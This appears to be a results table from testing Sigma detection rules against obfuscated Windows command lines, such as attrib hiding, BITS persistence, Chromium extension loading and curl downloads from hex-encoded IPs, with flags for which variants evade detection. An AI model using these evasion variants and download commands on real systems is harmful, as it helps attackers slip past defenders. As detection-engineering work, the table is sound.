Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1564.001	proc_creation_win_attrib_hiding_files	Hiding Files with Attrib.exe	4281cb20-2994-4580-aa63-c8b86d019934		"attrib.exe ""+h"" C:\Users\thaim\AppData\Local\Temp\T1564.001.txt"	TRUE	TRUE	TRUE	
t1564.001	proc_creation_win_attrib_hiding_files	Hiding Files with Attrib.exe	4281cb20-2994-4580-aa63-c8b86d019934	attrib.exe  +h  C:\Users\thaim\AppData\Local\Temp\T1564.001.txt	cmd.exe /c attrib.exe +h^  C:\Users\thaim\AppData\Local\Temp\T1564.001.txt	TRUE	FALSE	FALSE	Hiding Files with Attrib.exe (4281cb20-2994-4580-aa63-c8b86d019934)
t1564.001	proc_creation_win_attrib_hiding_files	Hiding Files with Attrib.exe	4281cb20-2994-4580-aa63-c8b86d019934		"powershell.exe -Command ""Set-ItemProperty -Path 'C:\Users\thaim\AppData\Local\Temp\T1564.001.txt' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)"""	TRUE	TRUE	FALSE	Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); PowerShell Script Run in AppData (ac175779-025a-4f12-98b0-acdaeb77ea85); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1564.001	proc_creation_win_attrib_system_susp_paths	Set Suspicious Files as System Files Using Attrib.EXE	efec536f-72e8-4656-8960-5e85d091345b		"attrib.exe ""+s"" C:\Users\Public\payload.exe"	TRUE	TRUE	TRUE	
t1564.001	proc_creation_win_attrib_system_susp_paths	Set Suspicious Files as System Files Using Attrib.EXE	efec536f-72e8-4656-8960-5e85d091345b	attrib.exe  +s  C:\Users\Public\payload.exe	cmd.exe /c attrib.exe +s^  C:\Users\Public\payload.exe	TRUE	FALSE	FALSE	Set Suspicious Files as System Files Using Attrib.EXE (efec536f-72e8-4656-8960-5e85d091345b)
t1564.001	proc_creation_win_attrib_system_susp_paths	Set Suspicious Files as System Files Using Attrib.EXE	efec536f-72e8-4656-8960-5e85d091345b		"powershell.exe -Command ""(Get-Item 'C:\Users\Public\payload.exe').Attributes = 'System'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		"bitsadmin.exe ""/addfile"" AtomicBITS h""tt""ps://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\Public\T1197.ps1"	TRUE	TRUE	TRUE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		"bitsadmin.exe ""/SetNotifyCmdLine"" AtomicBITS powershell.exe ""-Command Start-Process calc.exe"""	TRUE	TRUE	TRUE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		"powershell.exe -Command ""Start-BitsTransfer -Source 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md' -Destination 'C:\Users\Public\T1197.ps1'"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1176.001	proc_creation_win_browsers_chromium_load_extension	Chromium Browser Instance Executed With Custom Extension	88d6e60c-759d-4ac1-a447-c0f1466c2d21		"""C:\Program Files\Google\Chrome\Application\chrome.exe"" ""--load-extension=""C:\Users\user\AppData\Local\Temp\HHe2lr"""""	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_load_extension	Chromium Browser Instance Executed With Custom Extension	88d6e60c-759d-4ac1-a447-c0f1466c2d21		"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --load-extension ""C:\Users\user\AppData\Local\Temp\HHe2lr"""	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_load_extension	Chromium Browser Instance Executed With Custom Extension	88d6e60c-759d-4ac1-a447-c0f1466c2d21		"copy ""C:\Program Files\Google\Chrome\Application\chrome.exe"" ""C:\Windows\Temp\browser_host.exe"" && ""C:\Windows\Temp\browser_host.exe"" --load-extension=""C:\Users\user\AppData\Local\Temp\HHe2lr"""	TRUE	TRUE	TRUE	
t1176.001	proc_creation_win_browsers_chromium_susp_load_extension	Suspicious Chromium Browser Instance Executed With Custom Extension	27ba3207-dd30-4812-abbf-5d20c57d474e		"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --load-extension ""C:\Users\user\AppData\Local\Temp\HHe2lr"""	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_susp_load_extension	Suspicious Chromium Browser Instance Executed With Custom Extension	27ba3207-dd30-4812-abbf-5d20c57d474e		"explorer.exe ""C:\Program Files\Google\Chrome\Application\chrome.exe"" --load-extension=""C:\Users\user\AppData\Local\Temp\HHe2lr"""	TRUE	TRUE	TRUE	
t1176.001	proc_creation_win_browsers_chromium_susp_load_extension	Suspicious Chromium Browser Instance Executed With Custom Extension	27ba3207-dd30-4812-abbf-5d20c57d474e		"cmd.exe /c ""C:\Program Files\Google\Chrome\Application\chrome.exe"" ""--load-extension=""C:\Users\user\AppData\Local\Temp\HHe2lr"""""	FALSE	FALSE	FALSE	
tactics_execution	proc_creation_win_browsers_chromium_mockbin_abuse	Chromium Browser Headless Execution To Mockbin Like Site	1c526788-0abe-4713-862f-b520da5e5316		"copy ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" ""C:\Windows\Temp\sys_updater.exe"" && ""C:\Windows\Temp\sys_updater.exe"" --headless=new --disable-gpu https://mockbin.org/bin/31b1332f-8f5c-490e-8ec0-78e77b4e5709"	TRUE	TRUE	TRUE	
tactics_execution	proc_creation_win_browsers_chromium_mockbin_abuse	Chromium Browser Headless Execution To Mockbin Like Site	1c526788-0abe-4713-862f-b520da5e5316		"cmd.exe /c ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --head^less=new --disable-gpu https://mockbin.org/bin/31b1332f-8f5c-490e-8ec0-78e77b4e5709"	FALSE	FALSE	FALSE	
tactics_execution	proc_creation_win_browsers_chromium_mockbin_abuse	Chromium Browser Headless Execution To Mockbin Like Site	1c526788-0abe-4713-862f-b520da5e5316		"cmd.exe /c ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --headless=new --disable-gpu https://mock^bin.org/bin/31b1332f-8f5c-490e-8ec0-78e77b4e5709"	FALSE	FALSE	FALSE	
tactics_execution	proc_creation_win_curl_cookie_hijacking	Potential Cookies Session Hijacking	5a6e1e16-07de-48d8-8aae-faa766c05e88	"curl.exe  --cookie-jar=\""cookie\"" \""http://example.com\"""	"curl.exe --cookie-jar=""cookie"" ""http://example.com"""	TRUE	FALSE	FALSE	Potential Cookies Session Hijacking (5a6e1e16-07de-48d8-8aae-faa766c05e88)
tactics_execution	proc_creation_win_curl_cookie_hijacking	Potential Cookies Session Hijacking	5a6e1e16-07de-48d8-8aae-faa766c05e88	"curl.exe  \""--cookie-jar\"" cookie \""http://example.com\"""	"curl.exe ""--cookie-jar"" cookie ""http://example.com"""	TRUE	FALSE	FALSE	Potential Cookies Session Hijacking (5a6e1e16-07de-48d8-8aae-faa766c05e88)
tactics_execution	proc_creation_win_curl_cookie_hijacking	Potential Cookies Session Hijacking	5a6e1e16-07de-48d8-8aae-faa766c05e88	"curl.exe  -c cookie \""http://example.com\"""	"cmd.exe /c curl.exe -c^ cookie ""http://example.com"""	TRUE	FALSE	FALSE	Potential Cookies Session Hijacking (5a6e1e16-07de-48d8-8aae-faa766c05e88)
tactics_execution	proc_creation_win_curl_cookie_hijacking	Potential Cookies Session Hijacking	5a6e1e16-07de-48d8-8aae-faa766c05e88		"powershell.exe -Command ""Invoke-WebRequest -Uri 'http://example.com' -SessionVariable 'cookie_session'"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
tactics_execution	proc_creation_win_curl_custom_user_agent	Curl Web Request With Potential Custom User-Agent	85de1f22-d189-44e4-8239-dc276b45379b		"curl.exe --user-agent ""EvilAgent"" http://example.com"	TRUE	TRUE	TRUE	
tactics_execution	proc_creation_win_curl_custom_user_agent	Curl Web Request With Potential Custom User-Agent	85de1f22-d189-44e4-8239-dc276b45379b		"curl.exe -A ""EvilAgent"" http://example.com"	TRUE	TRUE	TRUE	
tactics_execution	proc_creation_win_curl_custom_user_agent	Curl Web Request With Potential Custom User-Agent	85de1f22-d189-44e4-8239-dc276b45379b	"curl.exe  -H \""User-Agent: EvilAgent\"" http://example.com"	"cmd.exe /c curl.exe -H^ ""User-Agent: EvilAgent"" http://example.com"	TRUE	FALSE	FALSE	Curl Web Request With Potential Custom User-Agent (85de1f22-d189-44e4-8239-dc276b45379b)
tactics_execution	proc_creation_win_curl_custom_user_agent	Curl Web Request With Potential Custom User-Agent	85de1f22-d189-44e4-8239-dc276b45379b		"curl.exe ""-H"" ""User-Agent: EvilAgent"" http://example.com"	TRUE	TRUE	TRUE	
tactics_execution	proc_creation_win_curl_download_direct_ip_exec	File Download From IP URL Via Curl.EXE	9cc85849-3b02-4cb5-b371-3a1ff54f2218		"curl --output=""hello.txt"" https://0x0c22384e/hack/evil.txt"	TRUE	TRUE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Obfuscated IP Download Activity (cb5a2333-56cf-4562-8fcb-22ba1bca728d); Obfuscated IP Download Activity (cb5a2333-56cf-4562-8fcb-22ba1bca728d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_download_direct_ip_exec	File Download From IP URL Via Curl.EXE	9cc85849-3b02-4cb5-b371-3a1ff54f2218		"curl ""--out""""put"" hello.txt https://12.34.56.78/hack/evil.txt"	TRUE	TRUE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_download_direct_ip_exec	File Download From IP URL Via Curl.EXE	9cc85849-3b02-4cb5-b371-3a1ff54f2218	curl  -o hello.txt https://12.34.56.78/hack/evil.txt	curl -o hello.txt https://12.34.56.78/hack/evil.txt	TRUE	FALSE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); File Download From IP URL Via Curl.EXE (9cc85849-3b02-4cb5-b371-3a1ff54f2218); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_download_direct_ip_susp_extensions	Suspicious File Download From IP Via Curl.EXE	5cb299fc-5fb1-4d07-b989-0644c68b6043		"curl  -o benign.hta ""https://12.34.56.78/hack/evil.hta"""	TRUE	TRUE	FALSE	File Download From IP URL Via Curl.EXE (9cc85849-3b02-4cb5-b371-3a1ff54f2218); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
tactics_execution	proc_creation_win_curl_download_direct_ip_susp_extensions	Suspicious File Download From IP Via Curl.EXE	5cb299fc-5fb1-4d07-b989-0644c68b6043		"curl  --output benign.hta ""https://0x0c22384e/hack/evil.hta"""	TRUE	TRUE	FALSE	Obfuscated IP Download Activity (cb5a2333-56cf-4562-8fcb-22ba1bca728d); Obfuscated IP Download Activity (cb5a2333-56cf-4562-8fcb-22ba1bca728d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
